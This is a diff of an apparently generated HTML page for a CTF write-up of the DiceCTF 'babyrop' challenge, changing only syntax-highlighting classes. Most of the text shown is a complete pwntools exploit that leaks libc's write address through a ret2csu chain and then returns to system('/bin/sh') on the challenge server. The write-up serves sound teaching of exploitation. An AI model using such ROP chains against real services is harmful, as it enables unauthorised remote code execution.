@@ -1,4 +1,4 @@
-I"Ö6<h2 id="challenge-description">Challenge Description</h2>
+I"):<h2 id="challenge-description">Challenge Description</h2>
 <p><img src="/assets/images/challdesbabyrop.png" alt="" /></p>
 
 <h3 id="solution">Solution:</h3>
@@ -67,12 +67,12 @@ rdx - size of the buffer = &gt;8
 </code></pre>
 <p>Hmmm :(. Seems like there is a compare statement thatâ€™ll make us jump back to the csu+64 (which is somewhere in the middle of csu). Now lets make rbp as 1 so we dont take the jump.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mi">72</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011ca</span><span class="p">)</span> <span class="c1">#rbx rbp r12 r13 r14 r15
-</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011b0</span><span class="p">)</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'main'</span><span class="p">])</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mi">72</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000004011ca</span><span class="p">)</span> <span class="c1">#rbx rbp r12 r13 r14 r15
+</span><span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">])</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">])</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000004011b0</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">])</span>
 </code></pre></div></div>
 
 <p>Exploit for leaking libc write address looks something like this. :) Now lets just recv the leak and see what libc they are using. To find out their libc go to <a href="https://libc.blukat.me/">libc.blukat.me</a></p>
@@ -84,70 +84,70 @@ rdx - size of the buffer = &gt;8
 <p>Anyway here is the exploit script for this challenge.</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="c1"># Set up pwntools for the correct architecture
-</span><span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'i386'</span><span class="p">)</span>
-<span class="n">exe</span> <span class="o">=</span> <span class="s">'./babyrop'</span>
+</span><span class="n">context</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="sh">'</span><span class="s">i386</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">exe</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./babyrop</span><span class="sh">'</span>
 
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./babyrop"</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./babyrop</span><span class="sh">"</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
     <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
 
 <span class="c1"># ./exploit.py GDB
-</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
 continue
-'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>
 
 <span class="c1">#===========================================================
 #                    EXPLOIT GOES HERE
 #===========================================================
 </span>
-<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"dicec.tf"</span><span class="p">,</span> <span class="mi">31924</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">dicec.tf</span><span class="sh">"</span><span class="p">,</span> <span class="mi">31924</span><span class="p">)</span>
 
 <span class="c1"># shellcode = asm(shellcraft.sh())
 </span>
-<span class="s">'''
+<span class="sh">'''</span><span class="s">
 0x00000000004011d3 : pop rdi ; ret
 
 write syscall 
 rdi = 1
 rsi = pointer to puffer (pointer to write function)
 rdx = size
-'''</span>
+</span><span class="sh">'''</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">)</span>
 
-<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mi">72</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011ca</span><span class="p">)</span> <span class="c1">#rbx rbp r12 r13 r14 r15
-</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011b0</span><span class="p">)</span> 
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'main'</span><span class="p">])</span>
-<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mi">72</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000004011ca</span><span class="p">)</span> <span class="c1">#rbx rbp r12 r13 r14 r15
+</span><span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">])</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">])</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000004011b0</span><span class="p">)</span> 
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">])</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
 
 <span class="c1"># log.info("write leak: {}".format((hex(u64(p.recv(8))))))
 </span>
-<span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))),</span> <span class="mi">16</span><span class="p">)</span>
-<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Write leak: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)))</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Write leak: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)))</span>
 
 <span class="n">sys</span> <span class="o">=</span> <span class="n">leak</span><span class="o">-</span><span class="mh">0xbbdc0</span>
 
 <span class="n">binsh</span> <span class="o">=</span> <span class="n">leak</span><span class="o">+</span><span class="mh">0xa63da</span>
 
-<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mi">72</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40116b</span><span class="p">)</span> <span class="c1">#ret
-</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011d3</span><span class="p">)</span> <span class="c1">#pop rdi 
-</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mi">72</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x40116b</span><span class="p">)</span> <span class="c1">#ret
+</span><span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000004011d3</span><span class="p">)</span> <span class="c1">#pop rdi 
+</span><span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 
 
 </code></pre></div></div>
